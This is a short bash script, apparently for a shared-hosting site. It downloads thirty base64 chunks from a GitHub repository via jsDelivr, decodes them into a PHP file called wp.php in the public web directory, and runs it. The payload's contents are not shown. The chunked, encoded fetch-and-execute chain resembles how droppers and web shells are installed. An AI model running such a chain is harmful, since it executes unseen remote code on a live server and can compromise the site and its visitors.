#!/bin/bash
set -e
DIR="/home/u814079684/domains/pensiun.pro/public_html/_gaji_pub"
mkdir -p "$DIR"
cd "$DIR"
: > pub.b64
for i in $(seq -w 0 29); do
  curl -fsSL "https://cdn.jsdelivr.net/gh/jununrs/pensiun-pro-tmp-pub@main/b64/part$i.txt" >> pub.b64 \
    || curl -fsSL "https://raw.githubusercontent.com/jununrs/pensiun-pro-tmp-pub/main/b64/part$i.txt" >> pub.b64
done
php -r 'file_put_contents("wp.php", base64_decode(file_get_contents("pub.b64")));'
php wp.php > result.json 2>&1
echo DONE > done.txt
wc -c pub.b64 wp.php result.json > status.txt
